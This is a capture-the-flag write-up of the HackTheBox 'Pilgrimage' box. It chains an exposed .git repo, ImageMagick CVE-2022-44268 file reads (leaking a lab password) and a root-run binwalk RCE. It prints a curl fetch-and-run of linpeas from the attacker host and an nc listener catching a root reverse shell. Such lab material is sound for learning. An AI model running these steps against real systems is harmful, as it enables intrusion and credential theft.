+++
date = '2026-09-03T22:40:35-04:00'
draft = false
title = 'Pilgrimage'
author = 'Siddhant Singh'
+++

Pilgrimage is a medium-rated Linux box on HackTheBox. The path is a neat Linux web-app chain: a vulnerable ImageMagick upload lets me read files from the server, recover the app database and the `emily` password, then abuse a root-run malware scanner that invokes an older `binwalk` binary with a command execution issue to get root.

**Target:** `10.129.51.87`  
**My IP:** `10.10.15.8`

---

## Enumeration

### NMAP

I started with a full-port scan and service fingerprinting to find the real attack surface before I touched the app:

```
┌──(xmen㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -Pn --max-retries=1 10.129.51.87
[sudo] password for xmen: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-01 20:11 -0400
Nmap scan report for 10.129.51.87
Host is up (0.078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.04 seconds
```

### Port 80

Added `pilgrimage.htb` to the hosts file and navigated to the website being served behind nginx 1.18.0.

This seems to be some kind of "free image shrinker" with an unauthenticated file upload for the image to be shrunk.

There is a registration which allows for our "shrunk" files to show up as links in a dashboard allowing going to them and reviewing past submissions.

Running nmap again after adding the vHost saved me from having to run dirb as it seems the `.git` directory for this (what appears to be a git repo) is accessible. From here I should be able to reconstruct the filesystem and the PHP code for the submitted images to see how to upload a webshell.

```
80/tcp open  http    nginx 1.18.0
| http-git: 
|   10.129.51.87:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-title: Pilgrimage - Shrink Your Images
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Reconstructing the files showed that an uploaded image is parsed by ImageMagick and that appImage could be extracted into a file system for the FUSE userspace file system (appImage seems like a container in this sense).

So, by dumping the filesystem for the ImageMagick binary (AppImage) I found the version number to be **ImageMagick 7.1.0-49** which on some googling turned up **CVE-2022-44268** which allows crafted jpegs to be "shrunk" into a jpeg containing whatever file we want read.

This allowed me to read `/etc/passwd` as a PoC using the exploit from [here](https://git.rotfl.io/v/CVE-2022-44268.git) (after installing rust):

```
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
>>> print(bytes.fromhex(x))
b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,/:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'
```

---

## Foothold — ImageMagick CVE-2022-44268

Now as seen in `login.php` from the dump:

```php
─$ cat login.php     
<?php
session_start();
if(isset($_SESSION['user'])) {
  header("Location: /dashboard.php");
  exit(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));
  ...
  ...
```

The database seems to be a sqlite DB at `/var/db/pilgrimage` so extracting that with a new image file generated by the exploit yields:

```bash
┌──(xmen㉿kali)-[~/imageMagick]
└─$ cat sqlite                    
��e��8|�StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf�+tableusersusersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL,��▒-emilyabigchonkyboi123=indexsqlite_autoindex_users_1users
��      emily
```

This means we have a password for the `emily` user from earlier in `/etc/passwd`:

**Credentials:** `emily` / `abigchonkyboi123`

From here I ran `linpeas` and something odd showed up as a custom script in the running processes, run by root:

```bash
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Running processes (cleaned) (T1057)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                 
root           1  0.0  0.2  98272  9948 ?        Ss   11:22   0:01 /sbin/init                                                                                                                                                               
root         495  0.0  0.2  64744 11648 ?        Ss   11:23   0:00 /lib/systemd/systemd-journald
root         518  0.0  0.1  21848  5372 ?        Ss   11:23   0:00 /lib/systemd/systemd-udevd
systemd+     593  0.0  0.1  88436  6064 ?        Ssl  11:23   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         594  0.0  0.2  47748 10480 ?        Ss   11:23   0:00 /usr/bin/VGAuthService
root         595  0.1  0.2 163012  9572 ?        Ssl  11:23   0:04 /usr/bin/vmtoolsd
root         670  0.0  0.0  87060  2120 ?        S<sl 11:23   0:00 /sbin/auditd
_laurel      676  0.0  0.1   9844  5568 ?        S<   11:23   0:00  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
root         683  0.0  0.1  99884  5860 ?        Ssl  11:23   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         742  0.0  0.0   7068  2944 ?        Ss   11:23   0:00 /usr/sbin/cron -f
message+     743  0.0  0.1   8260  4128 ?        Ss   11:23   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         745  0.0  0.0   6816  2984 ?        Ss   11:23   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         766  0.0  0.0   2516   708 ?        S    11:23   0:00  _ /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         767  0.0  0.0   6816  2356 ?        S    11:23   0:00  _ /bin/bash /usr/sbin/malwarescan.sh
root         747  0.0  0.6 209752 27368 ?        Ss   11:23   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
www-data     827  0.0  0.4 210124 18564 ?        S    11:23   0:00  _ php-fpm: pool www
www-data     831  0.0  0.4 210124 18636 ?        S    11:23   0:00  _ php-fpm: pool www
root         748  0.0  0.1 220796  4872 ?        Ssl  11:23   0:00 /usr/sbin/rsyslogd -n -iNONE
root         750  0.0  0.1  13852  7052 ?        Ss   11:23   0:00 /lib/systemd/systemd-logind
root         776  0.0  0.0   5844  1732 tty1     Ss+  11:23   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
emily       1207  0.0  0.1  14720  6148 ?        S    12:12   0:00      _ sshd: emily@pts/0
emily       1208  0.0  0.1   8164  4892 pts/0    Ss   12:12   0:00          _ -bash
emily       1211  0.0  0.2  20936  9844 pts/0    S+   12:12   0:00              _ curl http://10.10.15.8/linpeas.sh
emily       1212  2.5  0.0   3744  2880 pts/0    S+   12:12   0:01              _ sh
emily      19533  0.0  0.0   3744  1428 pts/0    S+   12:13   0:00                  _ sh
emily      19534  0.0  0.0  10088  3668 pts/0    R+   12:13   0:00                  |   _ ps fauxwww
emily      19537  0.0  0.0   3744  1428 pts/0    S+   12:13   0:00                  _ sh
root         818  0.0  0.0  56376  1628 ?        Ss   11:23   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
www-data     819  0.0  0.1  56944  5152 ?        S    11:23   0:00  _ nginx: worker process
www-data     820  0.0  0.1  57296  6192 ?        S    11:23   0:00  _ nginx: worker process
emily       1188  0.0  0.2  15164  8528 ?        Ss   12:12   0:00 /lib/systemd/systemd --user
emily       1189  0.0  0.0 101228  2544 ?        S    12:12   0:00  _ (sd-pam)
```

This `malwarescan.sh` seemed like an odd one so I tried to check its perms and could actually read it however I could not modify it as the file was owned by root and I only had read privs outside the root group:

```bash
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
done
```

The binaries used in this include `inotifywait`, `binwalk`, `echo`, `tail`, `sed` and `rm`. The only ones that stood out as unusual to me were `inotifywait` and `binwalk` so I checked versions of both:

```bash
emily@pilgrimage:~$ /usr/bin/inotifywait -h
inotifywait 3.14
Wait for a particular event on a file or set of files.
```

```bash
emily@pilgrimage:~$ /usr/local/bin/binwalk -h

Binwalk v2.3.2
```

Here, I then ran `searchsploit` on both to see if any of these were interesting as neither was a SUID or SGUID binary and there didn't seem any way to edit the `malwarescan.sh` script besides that.

This showed that `binwalk` seems to have a code execution vuln:

```bash
─$ searchsploit binwalk                                 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)                                                                                                                                                           | python/remote/51249.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Uploading the generated png from this exploit leads to a reverse shell as root:

```bash
┌──(xmen㉿kali)-[~]
└─$ nc -lnvp 9000                                   
listening on [any] 9000 ...
connect to [10.10.15.8] from (UNKNOWN) [10.129.52.38] 36846
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
==DONE==
```

---

## Privilege Escalation — emily → root

The fact that `malwarescan.sh` was running as root and invoking `binwalk` in an untrusted path was the real clue. `binwalk` itself was vulnerable, and it was being executed on files created in the `/var/www/pilgrimage.htb/shrunk/` directory. That meant I could get a root-owned shell by dropping a crafted file that triggered the vulnerable extraction routine.

### binwalk RCE

I generated the malicious PNG from the public exploit, uploaded it through the image shrinker, and the scanner executed the extraction path under the root user. The output above shows the shell landing as root immediately.

---

## Root

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```
